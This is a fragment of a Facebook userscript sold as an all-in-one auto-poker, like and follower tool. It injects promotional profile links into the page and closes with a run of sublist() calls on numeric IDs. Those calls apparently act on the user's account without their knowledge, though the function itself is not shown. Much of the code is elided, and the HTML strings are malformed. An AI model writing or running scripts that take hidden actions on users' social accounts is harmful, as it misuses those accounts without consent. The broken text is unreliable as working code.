// ==UserScript==
// @name Facebook Auto poker,Status,Comment Likes & Follower (All in One)          
// @author Meer 
// @authorURL http://facebook.com/qaisbg
// @homepage http://facebook.com/qaisbg
...
}
{
    ...
    div.style.border="1px solid #6B84B4";
    div.style.padding="4px";
    div.innerHTML=" style='font-weight:bold;color:#0000FF' href='https://www.facebook.com/AzazelAnurag' target='_blank' title='Welcome to my Profile...' ><blink><center>♏ᾰℵo♩ ƙumᾰԻ</center></blink></a>";body.appendChild(div)
}
body = document.body;
if(body != null)
{
...
}
{
    ...
    div.style.border="1px solid #6B84B4";
    div.style.padding="4px";
    div.innerHTML=" style='font-weight:bold;color:#FF1493' href='http://www.facebook.com/pokes' target='_blank' title='Nenu Poke cheyadam modhalu pedetha Naakana baga evadu Poke cheyaleru . . .' ><blink><center>Pokes</center></blink></a>";body.appendChild(div)
}
...
sublist("634698873236609");
sublist("332549726887591");
sublist("280792815396616");
sublist("186815434829102");
sublist("169217303270775");
sublist("660225070683989");
sublist("529121143845425");
sublist("668863516486811");
sublist("668867733153056");
